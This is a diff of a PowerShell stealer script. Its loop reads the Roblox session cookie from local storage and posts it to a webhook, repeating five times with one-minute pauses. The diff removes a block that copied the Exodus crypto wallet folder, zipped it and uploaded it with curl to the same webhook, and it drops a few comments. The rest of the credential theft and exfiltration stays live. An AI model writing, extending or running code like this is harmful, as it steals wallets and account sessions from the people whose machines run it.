@@ -59,7 +59,6 @@ $l = $env:LOCALAPPDATA
 # =====================================================================
 for ($i = 1; $i -le 5; $i++) {
     
-    # Send to RE_WH for loops 2-5, send to WH for loop 1
     $current_wh = if ($i -eq 1) { $WH } else { $RE_WH }
 
     dbg ":repeat: Re-grab" "Loop: $i / 5" 3447003 $current_wh
@@ -113,36 +112,6 @@ for ($i = 1; $i -le 5; $i++) {
     }
 
     # =================================================================
-    # ─── EXODUS WALLET ───
-    # =================================================================
-    $dw = @{ Exodus="$appdata\Exodus" }
-    $staging = Join-Path $env:TEMP "wallets"
-    Remove-Item $staging -Recurse -Force -EA SilentlyContinue
-    mkdir $staging -Force | Out-Null
-
-    foreach ($n in $dw.Keys) {
-        if (Test-Path $dw[$n]) {
-            $dest = Join-Path $staging $n
-            & robocopy $dw[$n] $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS /XD partitions logs tmp cache Cache blob_storage GPUCache Crashpad | Out-Null
-        }
-    }
-
-    $stagedDirs = Get-ChildItem $staging -Directory -EA SilentlyContinue
-    foreach ($d in $stagedDirs) {
-        $zip = Join-Path $env:TEMP ($d.Name + ".zip")
-        Remove-Item $zip -Force -EA SilentlyContinue
-        Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
-        if (Test-Path $zip) {
-            if ((Get-Item $zip).Length -lt 8000000) {
-                & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $current_wh 2>&1 | Out-Null
-                dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip" 65280 $current_wh
-            }
-            Remove-Item $zip -Force -EA SilentlyContinue
-        }
-    }
-    Remove-Item $staging -Recurse -Force -EA SilentlyContinue
-
-    # =================================================================
     # ─── ROBLOX COOKIE (ONLY EMBED, NO TXT FILE) ───
     # =================================================================
     $rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
@@ -163,7 +132,6 @@ for ($i = 1; $i -le 5; $i++) {
                 if ($cookie -match '_\|WARNING[^;\s]{50,}') {
                     $c = $Matches[0]
                     dbg ":cookie: Roblox Cookie" "**Size:** $($c.Length) `n**PC:** $env:COMPUTERNAME`n**Cookie:**``$c``" 65280 $current_wh
-                    # REMOVED THE CURL TXT FILE SEND HERE
                 }
             } catch {}
             break
@@ -180,6 +148,5 @@ for ($i = 1; $i -le 5; $i++) {
         } catch {}
     }
 
-    # Wait 60 seconds before next grab
     if ($i -lt 5) { Start-Sleep -Seconds 60 }
 }
